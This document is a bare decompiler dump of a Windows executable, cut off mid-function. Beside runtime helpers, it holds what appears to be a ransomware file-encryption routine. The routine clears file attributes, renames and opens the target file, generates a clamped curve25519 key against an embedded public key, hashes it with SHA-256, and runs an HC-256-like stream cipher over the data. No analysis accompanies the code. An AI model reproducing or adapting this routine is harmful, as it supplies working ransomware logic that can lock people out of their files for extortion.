//----- (0000000140005CE0) ----------------------------------------------------
__int64 __fastcall sub_140005CE0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _QWORD *a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11)
{
  char v12; // di
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-48h]
  __int64 v15; // [rsp+8h] [rbp-40h]
  __int64 v16; // [rsp+10h] [rbp-38h]
  __int64 v17; // [rsp+18h] [rbp-30h]
  unsigned __int64 v18[3]; // [rsp+30h] [rbp-18h] BYREF

  v12 = a3;
  v18[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
    result = sub_1400058D0(a3, (__int64)a6, a3 >> 1, a4, a3, a5, v14, v15, v16, v17, v18, a11);
  if ( a6 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 || (_DWORD)result == -2147024858 )
      *a6 = (v12 & 1) + 2 * v18[0];
  }
  return result;
}
// 140005D21: variable 'v14' is possibly undefined
// 140005D21: variable 'v15' is possibly undefined
// 140005D21: variable 'v16' is possibly undefined
// 140005D21: variable 'v17' is possibly undefined
// 140005CE0: using guessed type unsigned __int64 var_18[3];

//----- (0000000140005F20) ----------------------------------------------------
__int64 __fastcall sub_140005F20(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  return _InterlockedExchange64(&qword_140012108, a4);
}
// 140012108: using guessed type __int64 qword_140012108;

//----- (0000000140005F30) ----------------------------------------------------
__int64 sub_140005F30()
{
  return qword_140012108;
}
// 140005F30: using guessed type __int64 sub_140005F30();
// 140012108: using guessed type __int64 qword_140012108;

//----- (0000000140005F40) ----------------------------------------------------
char *sub_140005F40()
{
  return acmdln;
}

//----- (0000000140005F50) ----------------------------------------------------
__int64 sub_140005F50()
{
  return *(_QWORD *)&commode;
}
// 140005F50: using guessed type __int64 sub_140005F50();

//----- (0000000140005F60) ----------------------------------------------------
__int64 sub_140005F60()
{
  return *(_QWORD *)&fmode;
}
// 140005F60: using guessed type __int64 sub_140005F60();

//----- (0000000140005F70) ----------------------------------------------------
__int64 __fastcall sub_140005F70(size_t a1, __int64 a2, __int64 a3, int a4)
{
  unsigned int v4; // esi
  struct _RTL_CRITICAL_SECTION *v7; // rax
  struct _RTL_CRITICAL_SECTION *v8; // rdi

  v4 = 0;
  if ( dword_140012110 )
  {
    v7 = (struct _RTL_CRITICAL_SECTION *)calloc(a1, 0LL);
    if ( v7 )
    {
      v8 = v7;
      LODWORD(v7->DebugInfo) = a4;
      *(_QWORD *)&v7->LockCount = a3;
      EnterCriticalSection(v7);
      v8->OwningThread = Block;
      Block = v8;
      LeaveCriticalSection(v8);
    }
    else
    {
      return (unsigned int)-1;
    }
  }
  return v4;
}
// 140012110: using guessed type int dword_140012110;

//----- (0000000140005FF0) ----------------------------------------------------
__int64 __fastcall sub_140005FF0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  struct _RTL_CRITICAL_SECTION *v4; // rdi
  LPCRITICAL_SECTION OwningThread; // rcx
  LPCRITICAL_SECTION v6; // rax
  LPCRITICAL_SECTION v7; // rdx

  if ( dword_140012110 )
  {
    v4 = (struct _RTL_CRITICAL_SECTION *)a4;
    EnterCriticalSection((LPCRITICAL_SECTION)a4);
    OwningThread = Block;
    if ( Block )
    {
      if ( LODWORD(Block->DebugInfo) == (_DWORD)v4 )
      {
        v6 = 0LL;
LABEL_8:
        if ( v6 )
          v6->OwningThread = OwningThread->OwningThread;
        else
          Block = (LPCRITICAL_SECTION)OwningThread->OwningThread;
        free(v4);
      }
      else
      {
        v7 = Block;
        while ( 1 )
        {
          OwningThread = (LPCRITICAL_SECTION)v7->OwningThread;
          if ( !OwningThread )
            break;
          v6 = v7;
          v7 = (LPCRITICAL_SECTION)v7->OwningThread;
          if ( LODWORD(OwningThread->DebugInfo) == (_DWORD)v4 )
            goto LABEL_8;
        }
      }
    }
    LeaveCriticalSection(v4);
  }
  return 0LL;
}
// 140012110: using guessed type int dword_140012110;

//----- (0000000140006080) ----------------------------------------------------
__int64 __fastcall sub_140006080(LPCRITICAL_SECTION j, __int64 a2, int a3)
{
  LPCRITICAL_SECTION i; // rdi
  LPVOID Value; // rsi
  DWORD LastError; // eax
  __int64 v6; // rdx
  LPVOID v7; // rsi
  DWORD v8; // eax
  __int64 v9; // rdx
  LPCRITICAL_SECTION v10; // rcx
  struct _RTL_CRITICAL_SECTION *OwningThread; // rsi

  if ( a3 >= 2 )
  {
    if ( a3 == 2 )
    {
      sub_1400020C0();
    }
    else if ( a3 == 3 && dword_140012110 )
    {
      EnterCriticalSection(j);
      for ( i = Block; i; i = (LPCRITICAL_SECTION)i->OwningThread )
      {
        Value = TlsGetValue((DWORD)i);
        LastError = GetLastError();
        if ( Value && !LastError )
          (*(void (__fastcall **)(LPCRITICAL_SECTION, LPVOID, __int64, LPVOID))&i->LockCount)(i, Value, v6, Value);
      }
      LeaveCriticalSection(i);
    }
  }
  else if ( a3 )
  {
    if ( a3 == 1 )
    {
      if ( !dword_140012110 )
        InitializeCriticalSection(j);
      dword_140012110 = 1;
    }
  }
  else
  {
    if ( dword_140012110 )
    {
      EnterCriticalSection(j);
      for ( j = Block; j; j = (LPCRITICAL_SECTION)j->OwningThread )
      {
        v7 = TlsGetValue((DWORD)j);
        v8 = GetLastError();
        if ( v7 && !v8 )
          (*(void (__fastcall **)(LPCRITICAL_SECTION, LPVOID, __int64, LPVOID))&j->LockCount)(j, v7, v9, v7);
      }
      LeaveCriticalSection(j);
    }
    if ( dword_140012110 == 1 )
    {
      v10 = Block;
      if ( Block )
      {
        do
        {
          OwningThread = (struct _RTL_CRITICAL_SECTION *)v10->OwningThread;
          free(j);
          v10 = OwningThread;
        }
        while ( OwningThread );
      }
      Block = 0LL;
      dword_140012110 = 0;
      DeleteCriticalSection(j);
    }
  }
  return 1LL;
}
// 140006137: variable 'v6' is possibly undefined
// 140006193: variable 'v9' is possibly undefined
// 140012110: using guessed type int dword_140012110;

//----- (0000000140006230) ----------------------------------------------------
FILE *__fastcall sub_140006230(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  return &_iob_func()[a4];
}

//----- (00000001400062E0) ----------------------------------------------------
const char *__fastcall sub_1400062E0(const char *a1, __int64 a2, __int64 a3, const char *a4)
{
  size_t v5; // rax
  const char *v6; // rdi
  __int64 v7; // rcx
  char *v8; // rax
  unsigned int v9; // ebx
  unsigned int v10; // ebp

  v5 = strlen(a1);
  v6 = 0LL;
  if ( v5 <= 8 && *(_WORD *)off_14000D010 == 23117 )
  {
    v7 = *((int *)off_14000D010 + 15);
    if ( *(_DWORD *)((char *)off_14000D010 + v7) == 17744
      && (v8 = (char *)off_14000D010 + v7, *(_WORD *)((char *)off_14000D010 + v7 + 24) == 523)
      && (v9 = *((unsigned __int16 *)v8 + 3), *((_WORD *)v8 + 3)) )
    {
      v6 = &v8[*((unsigned __int16 *)v8 + 10) + 24];
      v10 = 0;
      while ( strncmp(v6, a4, (size_t)a4) )
      {
        ++v10;
        v6 += 40;
        if ( v10 >= v9 )
          return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  return v6;
}
// 14000D010: using guessed type void *off_14000D010;

//----- (0000000140006370) ----------------------------------------------------
__int64 __fastcall sub_140006370(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  char *v5; // r8
  int v6; // edx
  unsigned __int64 v7; // rcx
  __int64 result; // rax
  unsigned __int64 v9; // r8

  if ( *(_WORD *)off_14000D010 != 23117 )
    return 0LL;
  v4 = *((int *)off_14000D010 + 15);
  if ( *(_DWORD *)((char *)off_14000D010 + v4) != 17744 )
    return 0LL;
  v5 = (char *)off_14000D010 + v4;
  if ( *(_WORD *)((char *)off_14000D010 + v4 + 24) != 523 )
    return 0LL;
  v6 = *((unsigned __int16 *)v5 + 3);
  if ( !*((_WORD *)v5 + 3) )
    return 0LL;
  v7 = a4 - (_QWORD)off_14000D010;
  for ( result = (__int64)&v5[*((unsigned __int16 *)v5 + 10) + 24]; ; result += 40LL )
  {
    v9 = *(unsigned int *)(result + 12);
    if ( v7 >= v9 && v7 < (unsigned int)(*(_DWORD *)(result + 8) + v9) )
      break;
    if ( !--v6 )
      return 0LL;
  }
  return result;
}
// 14000D010: using guessed type void *off_14000D010;

//----- (00000001400063E0) ----------------------------------------------------
__int64 sub_1400063E0()
{
  __int64 result; // rax
  __int64 v1; // r8

  result = 0LL;
  if ( *(_WORD *)off_14000D010 == 23117 )
  {
    v1 = *((int *)off_14000D010 + 15);
    if ( *(_DWORD *)((char *)off_14000D010 + v1) == 17744 && *(_WORD *)((char *)off_14000D010 + v1 + 24) == 523 )
      return *(unsigned __int16 *)((char *)off_14000D010 + v1 + 6);
  }
  return result;
}
// 1400063E0: using guessed type __int64 sub_1400063E0();
// 14000D010: using guessed type void *off_14000D010;

//----- (0000000140006490) ----------------------------------------------------
void *sub_140006490()
{
  void *result; // rax
  __int64 v1; // rcx

  result = off_14000D010;
  if ( *(_WORD *)off_14000D010 != 23117 )
    return 0LL;
  v1 = *((int *)off_14000D010 + 15);
  if ( *(_DWORD *)((char *)off_14000D010 + v1) != 17744 || *(_WORD *)((char *)off_14000D010 + v1 + 24) != 523 )
    return 0LL;
  return result;
}
// 14000D010: using guessed type void *off_14000D010;

//----- (0000000140006550) ----------------------------------------------------
char *__fastcall sub_140006550(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  __int64 v4; // rax
  char *v5; // rax
  __int64 v6; // r10
  int v7; // r9d
  __int64 v8; // r11
  char *result; // rax
  __int64 v10; // rdx
  unsigned int v11; // esi
  _DWORD *v12; // rdx

  if ( *(_WORD *)off_14000D010 != 23117 )
    return 0LL;
  v4 = *((int *)off_14000D010 + 15);
  if ( *(_DWORD *)((char *)off_14000D010 + v4) != 17744 )
    return 0LL;
  v5 = (char *)off_14000D010 + v4;
  if ( *((_WORD *)v5 + 12) != 523 )
    return 0LL;
  v6 = *((unsigned int *)v5 + 36);
  if ( !*((_DWORD *)v5 + 36) || !*((_WORD *)v5 + 3) )
    return 0LL;
  v7 = 40 * *((unsigned __int16 *)v5 + 3);
  v8 = (__int64)&v5[*((unsigned __int16 *)v5 + 10) + 36];
  result = 0LL;
  v10 = 0LL;
  while ( 1 )
  {
    v11 = *(_DWORD *)(v8 + v10);
    if ( v11 <= (unsigned int)v6 && *(_DWORD *)(v8 + v10 - 4) + v11 > (unsigned int)v6 )
      break;
    v10 += 40LL;
    if ( v7 == (_DWORD)v10 )
      return result;
  }
  v12 = (char *)off_14000D010 + v6 + 12;
  result = 0LL;
  if ( *(_DWORD *)((char *)off_14000D010 + v6 + 4) )
    goto LABEL_16;
LABEL_15:
  if ( *v12 )
  {
LABEL_16:
    while ( a4 > 0 )
    {
      --a4;
      v12 += 5;
      if ( !*(v12 - 2) )
        goto LABEL_15;
    }
    return (char *)off_14000D010 + (unsigned int)*v12;
  }
  return result;
}
// 14000D010: using guessed type void *off_14000D010;

//----- (0000000140006614) ----------------------------------------------------
unsigned __int64 __fastcall sub_140006614(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        char a7)
{
  unsigned __int64 v7; // rax
  char *v8; // rcx
  unsigned __int64 v10; // [rsp-8h] [rbp-10h]

  v10 = v7;
  v8 = &a7;
  if ( v7 >= 0x1000 )
  {
    do
    {
      v8 -= 4096;
      v7 -= 4096LL;
    }
    while ( v7 > 0x1000 );
  }
  return v10;
}
// 140006615: variable 'v7' is possibly undefined

//----- (0000000140006644) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __fastcall Z17_e3cc5b58c71c8439Pw(
        double a1,
        double a2,
        double a3,
        double a4,
        double a5,
        double a6,
        __m128 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        const WCHAR *a11)
{
  unsigned __int64 v11; // rdi
  __m128i si128; // xmm0
  int v13; // eax
  __int64 v14; // rdx
  const WCHAR *v15; // rax
  WCHAR *v16; // rsi
  DWORD *FileW; // r15
  __int64 v18; // rdx
  int *v19; // rax
  int *v20; // r12
  double v21; // xmm4_8
  double v22; // xmm5_8
  double v23; // xmm4_8
  double v24; // xmm5_8
  __int64 i; // rax
  __int64 v26; // rcx
  int v27; // eax
  int v28; // edx
  unsigned __int64 v29; // rt0
  __int64 v30; // rsi
  char *v31; // rax
  __int64 v32; // rcx
  __int64 j; // rax
  __int32 v35; // ebx
  __int32 v36; // ecx
  unsigned __int64 k; // rax
  int v38; // ecx
  __int64 m; // rax
  unsigned int v40; // r8d
  __int64 n; // rax
  __int64 v42; // rax
  __int32 v43; // ecx
  unsigned __int32 v44; // r8d
  LARGE_INTEGER v45; // rsi
  __int64 ii; // rax
  __int64 jj; // rax
  int v48; // r11d
  unsigned int v49; // ecx
  int v50; // r10d
  __int32 v51; // esi
  __int32 v52; // esi
  __int32 v53; // esi
  __int32 v54; // eax
  int v55; // eax
  int v56; // eax
  int v57; // eax
  int v58; // eax
  int v59; // eax
  int v60; // eax
  int v61; // edx
  int v62; // edx
  int v63; // esi
  int v64; // esi
  int v65; // ebp
  __int32 v66; // edx
  __int32 v67; // edx
  __int32 v68; // edx
  __int32 v69; // eax
  __int32 v70; // eax
  __int32 v71; // eax
  __int32 v72; // eax
  __int32 v73; // edx
  __int32 v74; // edx
  __int32 v75; // edx
  __int32 v76; // eax
  __int32 v77; // eax
  __int32 v78; // edx
  __int32 v79; // edx
  __int32 v80; // edx
  __int32 v81; // edx
  unsigned int v82; // eax
  __int64 v83; // rcx
  unsigned __int64 v84; // rbx
  __int64 v85; // r14
  __int64 v86; // rbp
  LARGE_INTEGER *v87; // rbx
  HANDLE v89; // [rsp+0h] [rbp-12D8h] BYREF
  __int64 v90; // [rsp+20h] [rbp-12B8h]
  int v91; // [rsp+28h] [rbp-12B0h]
  __int64 v92; // [rsp+30h] [rbp-12A8h]
  unsigned int v93[6]; // [rsp+40h] [rbp-1298h] BYREF
  __int64 v94; // [rsp+58h] [rbp-1280h]
  _OWORD v95[4]; // [rsp+60h] [rbp-1278h]
  _DWORD v96[32]; // [rsp+A0h] [rbp-1238h] BYREF
  __int128 v97; // [rsp+120h] [rbp-11B8h] BYREF
  __int128 v98; // [rsp+130h] [rbp-11A8h]
  __m128i v99[12]; // [rsp+140h] [rbp-1198h] BYREF
  __int128 v100; // [rsp+150h] [rbp-1188h]
  __int128 v101; // [rsp+160h] [rbp-1178h]
  _OWORD v102[9]; // [rsp+170h] [rbp-1168h]
  int v103; // [rsp+200h] [rbp-10D8h]
  _OWORD v104[243]; // [rsp+204h] [rbp-10D4h] BYREF
  unsigned int v105; // [rsp+1140h] [rbp-198h]
  unsigned int v106; // [rsp+1144h] [rbp-194h]
  unsigned int v107; // [rsp+1148h] [rbp-190h]
  unsigned int v108; // [rsp+114Ch] [rbp-18Ch]
  unsigned int v109; // [rsp+1150h] [rbp-188h]
  unsigned int v110; // [rsp+1154h] [rbp-184h]
  unsigned int v111; // [rsp+1158h] [rbp-180h]
  unsigned int v112; // [rsp+115Ch] [rbp-17Ch]
  unsigned int v113; // [rsp+1160h] [rbp-178h]
  unsigned int v114; // [rsp+1164h] [rbp-174h]
  unsigned int v115; // [rsp+1168h] [rbp-170h]
  unsigned int v116; // [rsp+116Ch] [rbp-16Ch]
  unsigned int v117; // [rsp+1170h] [rbp-168h]
  unsigned int v118; // [rsp+1174h] [rbp-164h]
  unsigned int LowPart; // [rsp+1178h] [rbp-160h]
  unsigned int v120; // [rsp+117Ch] [rbp-15Ch]
  unsigned int v121; // [rsp+1180h] [rbp-158h]
  unsigned int v122; // [rsp+1184h] [rbp-154h]
  unsigned int v123; // [rsp+1188h] [rbp-150h]
  unsigned int v124; // [rsp+118Ch] [rbp-14Ch]
  unsigned int v125; // [rsp+1190h] [rbp-148h]
  unsigned int v126; // [rsp+1194h] [rbp-144h]
  unsigned int v127; // [rsp+1198h] [rbp-140h]
  unsigned int v128; // [rsp+119Ch] [rbp-13Ch]
  unsigned int v129; // [rsp+11A0h] [rbp-138h]
  unsigned int v130; // [rsp+11A4h] [rbp-134h]
  unsigned int v131; // [rsp+11A8h] [rbp-130h]
  unsigned int v132; // [rsp+11ACh] [rbp-12Ch]
  unsigned int v133; // [rsp+11B0h] [rbp-128h]
  unsigned int v134; // [rsp+11B4h] [rbp-124h]
  unsigned int v135; // [rsp+11B8h] [rbp-120h]
  unsigned int v136; // [rsp+11BCh] [rbp-11Ch]
  int v137; // [rsp+11C0h] [rbp-118h]
  __m128i v138; // [rsp+11C4h] [rbp-114h] BYREF
  __int128 v139; // [rsp+11D4h] [rbp-104h]
  _OWORD v140[2]; // [rsp+11E4h] [rbp-F4h]
  __int64 v141; // [rsp+1204h] [rbp-D4h]
  _WORD v142[16]; // [rsp+1210h] [rbp-C8h] BYREF
  unsigned int v143; // [rsp+1230h] [rbp-A8h]
  __int128 v144; // [rsp+1238h] [rbp-A0h]
  __m128i v145; // [rsp+1248h] [rbp-90h]
  _WORD v146[16]; // [rsp+1258h] [rbp-80h] BYREF
  __m128i v147; // [rsp+1278h] [rbp-60h] BYREF
  char v148; // [rsp+1297h] [rbp-41h]

  v11 = (unsigned __int64)a11;
  v98 = xmmword_14000D440;
  v97 = xmmword_14000D430;
  v144 = xmmword_14000D3A0;
  si128 = _mm_load_si128((const __m128i *)&xmmword_14000D3B0);
  v145 = si128;
  SetFileAttributesW(a11, a9);
  v13 = lstrlenW((LPCWSTR)v11);
  v15 = (const WCHAR *)sub_14000878B(v11, a9, v14, 2 * v13 + 14);
  if ( v15 )
  {
    v16 = (WCHAR *)v15;
    lstrcpyW((LPWSTR)v11, v15);
    lstrcatW((LPWSTR)v11, v16);
    LODWORD(v15) = MoveFileExW((LPCWSTR)v11, v16, (DWORD)v16);
    if ( (_DWORD)v15 )
    {
      v92 = 0LL;
      v91 = 0x8000000;
      LODWORD(v90) = 3;
      FileW = (DWORD *)CreateFileW((LPCWSTR)v11, (DWORD)v16, 0xC0000000, (LPSECURITY_ATTRIBUTES)v16, 0, 0, v89);
      GetProcessHeap();
      LODWORD(v15) = HeapFree((HANDLE)v11, (DWORD)v16, 0LL);
      if ( FileW != (DWORD *)-1LL )
      {
        GetFileSizeEx((HANDLE)v11, (PLARGE_INTEGER)v16);
        v19 = (int *)sub_14000878B(v11, (__int64)v16, v18, 0x100000);
        if ( v19 )
        {
          v20 = v19;
          CryptGenRandom(v11, (DWORD)&v147, (BYTE *)0x20);
          v147.m128i_i8[0] &= 0xF8u;
          v148 = v148 & 0x3F | 0x40;
          sub_14000A0C7(
            *(double *)si128.m128i_i64,
            a2,
            a3,
            a4,
            v21,
            v22,
            a7,
            v11,
            (__int64)&v147,
            &v147,
            v142,
            (unsigned __int16 *)&v97);
          sub_14000A0C7(
            *(double *)si128.m128i_i64,
            a2,
            a3,
            a4,
            v23,
            v24,
            a7,
            v11,
            (__int64)&v147,
            &v147,
            v146,
            word_1400110A0);
          for ( i = 0LL; i != 4; ++i )
            v99[i] = _mm_load_si128((const __m128i *)((char *)&SHA256_Constants_14000E420 + i * 16));
          v103 = 0;
          v104[0] = 0LL;
          sub_1400093C1(4294967292LL, (__int64)v99, (char *)v146, v99, 0x20u);
          v26 = 0LL;
          v27 = v103;
          do
          {
            v28 = 0;
            if ( (unsigned __int64)(v26 + 4) >= 2 )
              v28 = *((_DWORD *)v104 + (unsigned int)(v26 - 4 + 6));
            HIDWORD(v29) = *((_DWORD *)v104 + v26 + 3);
            LODWORD(v29) = v28;
            v93[v26-- + 3] = v29 >> 29;
          }
          while ( v26 != -4 );
          v30 = ((v27 > 111) << 7) - v27 + 112;
          LOBYTE(v96[0]) = 0x80;
          sub_1400093C1(4294967292LL, v30, (char *)v96, v99, v30);
          v31 = (char *)v96 + 3;
          v32 = 3LL;
          do
          {
            *(_DWORD *)(v31 - 3) = _byteswap_ulong(v93[v32]);
            v31 += 4;
          }
          while ( v32-- != 0 );
          sub_1400093C1(4294967292LL, v30, (char *)v96, v99, 0x10u);
          for ( j = 0LL; j != 8; ++j )
          {
            v35 = v99[0].m128i_i32[2 * j];
            v36 = v99[0].m128i_i32[2 * j + 1];
            *((_BYTE *)v95 + 8 * j) = HIBYTE(v35);
            *((_BYTE *)v95 + 8 * j + 1) = BYTE2(v35);
            *((_BYTE *)v95 + 8 * j + 2) = BYTE1(v35);
            *((_BYTE *)v95 + 8 * j + 3) = v35;
            *((_BYTE *)v95 + 8 * j + 4) = HIBYTE(v36);
            *((_BYTE *)v95 + 8 * j + 5) = BYTE2(v36);
            *((_BYTE *)v95 + 8 * j + 6) = BYTE1(v36);
            *((_BYTE *)v95 + 8 * j + 7) = v36;
          }
          v141 = 0x10000000100LL;
          v138 = (__m128i)v95[0];
          v139 = v95[1];
          k = 0LL;
          do
          {
            *((_DWORD *)v140 + k) = *((_DWORD *)&v95[2] + k);
            ++k;
          }
          while ( k < (unsigned __int64)HIDWORD(v141) >> 5 );
          if ( (unsigned int)k <= 7 )
          {
            for ( k = (unsigned int)k; k != 8; ++k )
              *((_DWORD *)v140 + k) = *((_DWORD *)v140 + (unsigned int)(k - 4));
          }
          v99[0] = _mm_loadu_si128(&v138);
          v100 = v139;
          v101 = v140[0];
          v102[0] = v140[1];
          v38 = _mm_cvtsi128_si32(v99[0]);
          for ( m = 16LL; m != 272; ++m )
          {
            v40 = v96[m + 25];
            v99[0].m128i_i32[m] = m
                                + (__ROL4__(v40, 25) ^ __ROL4__(v40, 14) ^ (v40 >> 3))
                                + (__ROL4__(*((_DWORD *)&v98 + m + 2), 15) ^ __ROL4__(*((_DWORD *)&v98 + m + 2), 13) ^ (*((_DWORD *)&v98 + m + 2) >> 10))
                                + *((_DWORD *)&v97 + m + 1)
                                + v38;
            v38 = v40;
          }
          for ( n = 0LL; n != 4; ++n )
            v99[n] = _mm_load_si128((const __m128i *)((char *)&v104[n + 51] + 12));
          v42 = 16LL;
          v43 = v99[0].m128i_i32[0];
          do
          {
            v44 = v96[v42 + 25];
            v45.QuadPart = (unsigned int)(__ROL4__(v44, 25) ^ __ROL4__(v44, 14));
            v99[0].m128i_i32[v42] = v42
                                  + (v45.LowPart ^ (v44 >> 3))
                                  + (__ROL4__(*((_DWORD *)&v98 + v42 + 2), 15) ^ __ROL4__(
                                                                                   *((_DWORD *)&v98 + v42 + 2),
                                                                                   13) ^ (*((_DWORD *)&v98 + v42 + 2) >> 10))
                                  + *((_DWORD *)&v97 + v42 + 1)
                                  + v43
                                  + 256;
            ++v42;
            v43 = v44;
          }
          while ( v42 != 1024 );
          v137 = 0;
          for ( ii = 256LL; ii != 260; ++ii )
            v99[ii] = _mm_load_si128((const __m128i *)((char *)&v89 + 1 * ii - 1792));
          for ( jj = 252LL; jj != 256; ++jj )
            v102[jj + 5] = _mm_load_si128(&v99[jj]);
          v48 = 64;
          do
          {
            v49 = v137;
            v11 = v137 & 0x1FF;
            v50 = (v137 + 16) & 0x1FF;
            v137 = (v137 + 16) & 0x3FF;
            if ( v49 > 0x1FF )
            {
              v11 = (unsigned int)v11 | 0x200;
              v66 = (v99[0].m128i_i32[(unsigned __int8)v125]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v125 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11] + (__ROL4__(v99[0].m128i_i32[v11 + 1], 23) ^ __ROL4__(v134, 10)) + __ROL4__(v127, 8));
              v99[0].m128i_i32[v11] = v66;
              v121 = v66;
              v67 = (v99[0].m128i_i32[(unsigned __int8)v126]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v126 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 1] + (__ROL4__(v99[0].m128i_i32[v11 + 2], 23) ^ __ROL4__(v135, 10)) + __ROL4__(v128, 8));
              v99[0].m128i_i32[v11 + 1] = v67;
              v122 = v67;
              v68 = (v99[0].m128i_i32[(unsigned __int8)v127]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v127 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 2] + (__ROL4__(v99[0].m128i_i32[v11 + 3], 23) ^ __ROL4__(v136, 10)) + __ROL4__(v129, 8));
              v99[0].m128i_i32[v11 + 2] = v68;
              v123 = v68;
              v69 = (v99[0].m128i_i32[(unsigned __int8)v128]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v128 >> 14) & 0x3FC) + 12)) ^ (v99[0].m128i_i32[v11 + 3] + (__ROL4__(*((_DWORD *)&v100 + v11), 23) ^ __ROL4__(v121, 10)) + __ROL4__(v130, 8));
              v99[0].m128i_i32[v11 + 3] = v69;
              v124 = v69;
              v70 = (v99[0].m128i_i32[(unsigned __int8)v129]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v129 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11) + (__ROL4__(*((_DWORD *)&v100 + v11 + 1), 23) ^ __ROL4__(v122, 10)) + __ROL4__(v131, 8));
              *((_DWORD *)&v100 + v11) = v70;
              v125 = v70;
              v71 = (v99[0].m128i_i32[(unsigned __int8)v130]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v130 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11 + 1) + (__ROL4__(*((_DWORD *)&v100 + v11 + 2), 23) ^ __ROL4__(v123, 10)) + __ROL4__(v132, 8));
              *((_DWORD *)&v100 + v11 + 1) = v71;
              v126 = v71;
              v72 = (v99[0].m128i_i32[(unsigned __int8)v131]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v131 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11 + 2) + (__ROL4__(*((_DWORD *)&v100 + v11 + 3), 23) ^ __ROL4__(v124, 10)) + __ROL4__(v133, 8));
              *((_DWORD *)&v100 + v11 + 2) = v72;
              v127 = v72;
              v73 = (v99[0].m128i_i32[(unsigned __int8)v132]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v132 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v100 + v11 + 3) + (__ROL4__(*((_DWORD *)&v102[-1] + v11), 23) ^ __ROL4__(v125, 10)) + __ROL4__(v134, 8));
              *((_DWORD *)&v100 + v11 + 3) = v73;
              v128 = v73;
              v74 = (v99[0].m128i_i32[(unsigned __int8)v133]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v133 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v102[-1] + v11) + (__ROL4__(*((_DWORD *)&v101 + v11 + 1), 23) ^ __ROL4__(v126, 10)) + __ROL4__(v135, 8));
              *((_DWORD *)&v102[-1] + v11) = v74;
              v129 = v74;
              v75 = (v99[0].m128i_i32[(unsigned __int8)v134]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v134 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + v11 + 1) + (__ROL4__(*((_DWORD *)&v101 + v11 + 2), 23) ^ __ROL4__(v127, 10)) + __ROL4__(v136, 8));
              *((_DWORD *)&v101 + v11 + 1) = v75;
              v130 = v75;
              v76 = (v99[0].m128i_i32[(unsigned __int8)v135]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v135 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + v11 + 2) + (__ROL4__(*((_DWORD *)&v101 + v11 + 3), 23) ^ __ROL4__(v128, 10)) + __ROL4__(v121, 8));
              *((_DWORD *)&v101 + v11 + 2) = v76;
              v131 = v76;
              v77 = (v99[0].m128i_i32[(unsigned __int8)v136]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v136 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)&v101 + v11 + 3) + (__ROL4__(*((_DWORD *)v102 + v11), 23) ^ __ROL4__(v129, 10)) + __ROL4__(v122, 8));
              *((_DWORD *)&v101 + v11 + 3) = v77;
              v132 = v77;
              v78 = (v99[0].m128i_i32[(unsigned __int8)v121]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v121 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11) + (__ROL4__(*((_DWORD *)v102 + v11 + 1), 23) ^ __ROL4__(v130, 10)) + __ROL4__(v123, 8));
              *((_DWORD *)v102 + v11) = v78;
              v133 = v78;
              v79 = (v99[0].m128i_i32[(unsigned __int8)v122]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v122 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11 + 1) + (__ROL4__(*((_DWORD *)v102 + v11 + 2), 23) ^ __ROL4__(v131, 10)) + __ROL4__(v124, 8));
              *((_DWORD *)v102 + v11 + 1) = v79;
              v134 = v79;
              v80 = (v99[0].m128i_i32[(unsigned __int8)v123]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v123 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11 + 2) + (__ROL4__(*((_DWORD *)v102 + v11 + 3), 23) ^ __ROL4__(v132, 10)) + __ROL4__(v125, 8));
              *((_DWORD *)v102 + v11 + 2) = v80;
              v135 = v80;
              v81 = (v99[0].m128i_i32[(unsigned __int8)v124]
                   + *(_DWORD *)((char *)&v104[51] + (((unsigned __int64)v124 >> 14) & 0x3FC) + 12)) ^ (*((_DWORD *)v102 + v11 + 3) + (__ROL4__(v99[0].m128i_i32[v50 | 0x200], 23) ^ __ROL4__(v133, 10)) + __ROL4__(v126, 8));
              *((_DWORD *)v102 + v11 + 3) = v81;
              v136 = v81;
            }
            else
            {
